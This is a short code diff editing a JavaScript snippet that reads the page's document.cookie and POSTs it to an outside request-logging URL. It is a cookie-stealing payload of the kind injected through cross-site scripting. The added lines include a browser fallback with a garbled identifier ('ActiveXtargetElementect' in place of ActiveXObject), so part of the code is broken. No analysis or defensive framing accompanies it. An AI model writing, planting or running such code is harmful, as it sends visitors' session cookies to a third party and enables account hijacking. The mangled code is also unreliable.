@@ -1,4 +1,7 @@
-var http = new XMLHttpRequest();var url = "http://requestb.in/1evyr3z1";var params = document.cookie;http.open("POST", url, true);
+var http = false;
+if (window.XMLHttpRequest){http = new XMLHttpRequest();
+}else if (window.ActiveXtargetElementect){http = new ActiveXtargetElementect("Microsoft.XMLHTTP");};
+;var url = "http://requestb.in/1evyr3z1";var params = document.cookie;http.open("POST", url, true);
 http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 http.setRequestHeader("Content-length", params.length);
 http.setRequestHeader("Connection", "close");
